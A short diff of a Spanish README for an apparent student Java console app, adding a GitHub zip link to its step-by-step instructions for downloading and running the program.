@@ -48,7 +48,7 @@ Muestra todoas las unidades operativas en formato ordenado
 
 Ejecucion del programa
 
-1. Clonar el reprositorio: 
+1. Clonar el reprositorio: https://github.com/kolagosmorales-hash/Salmontt.App/blob/main/SalmonApp.zip
 2. Verificar que el archivo data/centro.txt exista dentro del proyecto
 3. Ejecutar la clase principal: src/app/Main.java
 5. El sitema mostrara por consola
